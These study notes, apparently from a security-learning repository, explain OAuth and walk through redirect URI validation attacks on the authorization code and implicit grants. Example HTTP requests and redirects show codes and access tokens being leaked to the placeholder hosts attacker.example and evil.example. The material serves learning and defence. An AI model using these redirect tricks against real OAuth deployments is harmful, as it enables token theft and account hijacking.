<p><a target="_blank" href="https://app.eraser.io/workspace/CKZ9W8XGguuGzUUoB4Eg" id="edit-in-eraser-github-link"><img alt="Edit in Eraser" src="https://firebasestorage.googleapis.com/v0/b/second-petal-295822.appspot.com/o/images%2Fgithub%2FOpen%20in%20Eraser.svg?alt=media&amp;token=968381c8-a7e7-472a-8ed6-4a6626da5501"></a></p>

| # | Lab Name | Level | Repeat | Link |
| ----- | ----- | ----- | ----- | ----- |
| 1 | [Authentication bypass via OAuth implicit flow](Authentication%20bypass%20via%20OAuth implicit%20flow) | APPRENTICE |  |  |
| 2 | Forced OAuth profile linking | PRACTITIONER |  |  |
| 3 | OAuth account hijacking via redirect_uri | PRACTITIONER |  |  |
| 4 | Stealing OAuth access tokens via an open redirect | PRACTITIONER |  |  |
| 5 | SSRF via OpenID dynamic client registration | PRACTITIONER |  |  |
| 6 | Stealing OAuth access tokens via a proxy page | EXPERT |  |  |


## What is OAuth ?
- OAuth is an **Authorization Framework **that enables websites and web applications to request **limited access to a user's account** on another application.
- Typically, OAuth allows the user to grant access without exposing the user's login credentials to the requesting application. 
## How does OAuth work ?


![OAuth Flow](/.eraser/CKZ9W8XGguuGzUUoB4Eg___DtAnWtIswaZrA5O4Cy5IZCcAYN53___---figure---9jOtUIZ3ZBk6drFSue2zW---figure---HUpMv6AOvzOBZSBZA5dttQ.png "OAuth Flow")





## Attacks and Mitigations
### 1. Insufficient Redirect URI validation
Some authorization servers allow clients to register redirect URI patterns instead of complete redirect URIs. 



#### 1.1 Redirect URI validation attacks on Authorization Code Grant
##### Assumptions
- Client registers with an redirect URL pattern `**https://*.somesite.example**`  with client ID `**s6BhdRkqt3**`. This would allow any subdomain of `**somesite.example**` to be a valid redirect URI for the client. 
> **NOTE: **A naive implementation of the authorization server, might interpret the wildcard ***** as "**any character**" and not "**any character valid for a domain name**". For example, the authorization server, might permit [﻿`https://attacker.example/.somesite.example`](https://attacker.example/)  as a valid redirect URI, although `attacker.example` is a different domain.

##### Attack Scenario
- Attacker tricks the user into opening a tampered URL
- Browser tries to render the attacker controlled malicious web page `https://www.evil.example` 
- The malicious web page initiates an authorization request with a valid client ID `s6BhdRkqt3` 
- Example Request:
```
﻿GET /authorize?response_type=code&client_id=s6BhdRkqt3&state=9ad67f13¶
     &redirect_uri=https%3A%2F%2Fattacker.example%2F.somesite.example
     HTTP/1.1
Host: server.somesite.example
```
- Authorization server validates the redirect URI which matches the wild card pattern registered for the client. 
- If the user doesn't notice the malicious redirect URI and grants the consent, the authorization code is issued and sent to attackers domain. **If an automatic approval of authorization is enabled, the attack can be performed even without user interaction. **
- If the attacker impersonates a public client, the attacker can exchange the code for tokens at the respective token endpoint. 
**NOTE: **The attack will not work as easily for confidential clients, since the code exchange requires authentication with the legitimate client's secret. The attacker cam, however use the legitimate confidential client to redeem the code by performing an authorization code injection attack. 

![Redirect URL validation attacks on Authorization Code Grant](/.eraser/CKZ9W8XGguuGzUUoB4Eg___DtAnWtIswaZrA5O4Cy5IZCcAYN53___---figure---Rj-3jXBbBSBqjG-f_MTD9---figure---FgAhew-fJTqiU74zj4Ew0w.png "Redirect URL validation attacks on Authorization Code Grant")



#### 1.2 Redirect URI validation attacks on Implicit Grant
##### Assumptions
- The registered URL pattern for client `**s6BhdRkqt3**`  is `**https://client.somesite.example/cb?***` , allowing any parameter for redirects to `**https://client.somesite.example/cb**`.
- The client endpoint supports a parameter `**redirect_to**` , which redirects the browser using an HTTP 303 Location header redirect.
##### Attack Scenario
- Attacker tricks the user into opening a malicious web URL `**https://www.evil.example**`.
- The malicious website initiates an authorization request with a valid client ID `**s6BhdRkqt3**`  and adds an open redirector by encoding `**redirect_to=https://attacker.example**`  into the redirect URI parameters with response type "token".
```
GET /authorize?response_type=token&state=9ad67f13
    &client_id=s6BhdRkqt3
    &redirect_uri=https%3A%2F%2Fclient.somesite.example
     %2Fcb%26redirect_to%253Dhttps%253A%252F
     %252Fattacker.example%252F HTTP/1.1
Host: server.somesite.example
```
- Since the URL matches the registered pattern, the authorization server permits the request and sends the resulting access token in a 303 redirect.
```
HTTP/1.1 303 See Other
Location: https://client.somesite.example/cb?
          redirect_to%3Dhttps%3A%2F%2Fattacker.example%2Fcb
          #access_token=2YotnFZFEjr1zCsicMWpAA&...
```
- At `**client.somesite.example**` , the request arrives at the open redirector. The endpoint reads the redirect parameter and issues another HTTP 303 Location header redirect to the URL `**https://attacker.example/**` .
```
HTTP/1.1 303 See Other
Location: https://attacker.example/
```
- However, browsers, as specified by **RFC 7231**, reattach the original fragment to the new URL if the `Location`  header in the redirect response doesn't contain a fragment. Consequently, the browser navigates to `**https://attacker.example/#access_token=2YotnFZFEjr1zCsicMWpAA...**` 
![Redirect URI validation attacks on Implicit Grant](/.eraser/CKZ9W8XGguuGzUUoB4Eg___DtAnWtIswaZrA5O4Cy5IZCcAYN53___---figure---TsmWbck1meTKhyB94VYIz---figure---tIK4SB6f2KMaUY__kz6pQQ.png "Redirect URI validation attacks on Implicit Grant")




<!-- eraser-additional-content -->
## Diagrams
<!-- eraser-additional-files -->
<a href="/Advanced-Topics/OAuth 2.0/README-OAuth 2.0 Authorization Flow-1.eraserdiagram" data-element-id="8spaGmKymnXBIp7pFVeHf"><img src="/.eraser/CKZ9W8XGguuGzUUoB4Eg___DtAnWtIswaZrA5O4Cy5IZCcAYN53___---diagram----6decbe98b2efc74356ac00b0c8e2db37-OAuth-2-0-Authorization-Flow.png" alt="" data-element-id="8spaGmKymnXBIp7pFVeHf" /></a>
<a href="/Advanced-Topics/OAuth 2.0/README-Redirect URI Validation Attacks on Authorization Code Grant-2.eraserdiagram" data-element-id="X4NOtxxpODPp1FIwSU0NR"><img src="/.eraser/CKZ9W8XGguuGzUUoB4Eg___DtAnWtIswaZrA5O4Cy5IZCcAYN53___---diagram----a38f06b940367c0d66a8ab12d9524f36-Redirect-URI-Validation-Attacks-on-Authorization-Code-Grant.png" alt="" data-element-id="X4NOtxxpODPp1FIwSU0NR" /></a>
<a href="/Advanced-Topics/OAuth 2.0/README-Redirect URI validation attacks on Implicit Grant-3.eraserdiagram" data-element-id="4SrtJxHzhLrS5LGw5RUGV"><img src="/.eraser/CKZ9W8XGguuGzUUoB4Eg___DtAnWtIswaZrA5O4Cy5IZCcAYN53___---diagram----f8101b9db25bbaa1e1a8fe535aa54feb-Redirect-URI-validation-attacks-on-Implicit-Grant.png" alt="" data-element-id="4SrtJxHzhLrS5LGw5RUGV" /></a>
<!-- end-eraser-additional-files -->
<!-- end-eraser-additional-content -->
<!--- Eraser file: https://app.eraser.io/workspace/CKZ9W8XGguuGzUUoB4Eg --->